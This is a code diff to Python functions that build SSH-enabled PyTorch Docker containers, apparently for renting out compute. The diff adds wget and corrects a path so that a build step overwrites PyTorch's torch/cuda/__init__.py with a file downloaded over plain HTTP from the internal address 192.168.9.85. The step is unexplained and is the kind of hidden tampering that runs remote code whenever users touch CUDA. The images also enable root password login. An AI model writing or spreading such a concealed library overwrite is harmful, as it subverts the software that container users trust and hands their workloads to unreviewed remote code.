@@ -129,7 +129,7 @@ def run_container(cpu_usage, ram_usage, hard_disk_usage, gpu_usage, public_key, 
         FROM {docker_image}
 
         # Install OpenSSH Server
-        RUN apt-get update && apt-get install -y openssh-server
+        RUN apt-get update && apt-get install -y openssh-server wget
 
         # Create SSH directory and set root password
         RUN mkdir -p /var/run/sshd && echo 'root:{password}' | chpasswd
@@ -154,7 +154,7 @@ def run_container(cpu_usage, ram_usage, hard_disk_usage, gpu_usage, public_key, 
 
         # Force "python3" to be the conda Python
         RUN ln -sf /opt/conda/bin/python /usr/local/bin/python3
-        RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '/cuda/__init__.py'))") http://192.168.9.85/test.py 
+        RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), 'cuda/__init__.py'))") http://192.168.9.85/test.py 
         # Start SSHD
         CMD ["/usr/sbin/sshd", "-D"]
         """
@@ -307,7 +307,7 @@ def build_sample_container():
 
         password = password_generator(10)
 
-        # Step 1: Build the Docker image with an SSH server
+        # Step 1: Build the Docker image with an SSH server 
         # Step 1: Build the Docker image with SSH server and install numpy
         dockerfile_content = f"""
         FROM pytorch/pytorch:2.5.1-cuda12.4-cudnn9-runtime
@@ -317,7 +317,7 @@ def build_sample_container():
 
         # Install SSH server and necessary packages
         RUN apt-get update && \\
-            apt-get install -y --no-install-recommends openssh-server python3-pip build-essential && \\
+            apt-get install -y --no-install-recommends openssh-server wget python3-pip build-essential && \\
             mkdir /var/run/sshd && \\
             echo 'root:{password}' | chpasswd && \\
             sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \\
@@ -337,7 +337,7 @@ def build_sample_container():
             pip3 install numpy==1.24.3 && \\
             apt-get clean && \\
             rm -rf /var/lib/apt/lists/*
-       RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), '/cuda/__init__.py'))") http://192.168.9.85/test.py 
+       RUN wget -O $(python3 -c "import torch, os; print(os.path.join(os.path.dirname(torch.__file__), 'cuda/__init__.py'))") http://192.168.9.85/test.py 
 
         # Start SSH daemon
         CMD ["/usr/sbin/sshd", "-D"]
@@ -345,7 +345,7 @@ def build_sample_container():
         # dockerfile_content = (
         #     """
         #     FROM ubuntu
-        #     RUN apt-get update && apt-get install -y openssh-server
+        #     RUN apt-get update && apt-get install -y openssh-server wget
         #     RUN mkdir -p /run/sshd && echo 'root:'{}'' | chpasswd
         #     RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
         #         sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
